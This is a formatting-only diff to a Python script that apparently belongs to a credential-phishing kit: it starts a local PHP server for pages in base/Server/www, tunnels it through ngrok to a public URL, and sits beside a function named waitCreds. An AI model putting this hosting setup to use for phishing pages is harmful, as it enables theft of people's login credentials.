@@ -43,7 +43,7 @@ def waitCreds():
 @contextmanager
 def runServer(port: int):
     def php_process():
-        os.system("cd base/Server/www/ && php -n -S 127.0.0.1:%d > /dev/null 2>&1 &" % port)    
+        os.system("cd base/Server/www/ && php -n -S 127.0.0.1:%d > /dev/null 2>&1 &" % port)
     php_process = multiprocessing.Process(target=php_process)
     php_process.start()
     yield php_process
@@ -52,14 +52,22 @@ def runServer(port: int):
 
 @contextmanager
 def ngrok_start(port: int):
-    ngrok_process = subprocess.Popen(['./base/Server/ngrok','http','%s' % port], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    ngrok_process = subprocess.Popen(
+        ['./base/Server/ngrok','http','%s' % port], 
+        stdout=subprocess.PIPE, 
+        stderr=subprocess.PIPE
+    )
     while True:
         try:
-            ngrok_url = requests.get('http://127.0.0.1:4040/api/tunnels/command_line')
+            ngrok_url = requests.get(
+                'http://127.0.0.1:4040/api/tunnels/command_line'
+            )
             if ngrok_url.status_code == 200:
                 public_url = json.loads(ngrok_url.text)['public_url']
                 print(green('\n [*] Ngrok URL: %s' % public_url))
-                print(yellow(' [^] Press Ctrl+C or VolDown+C(android) to quit'))
+                print(
+                    yellow(' [^] Press Ctrl+C or VolDown+C(android) to quit')
+                    )
                 yield public_url
                 break
         except requests.exceptions.ConnectionError:
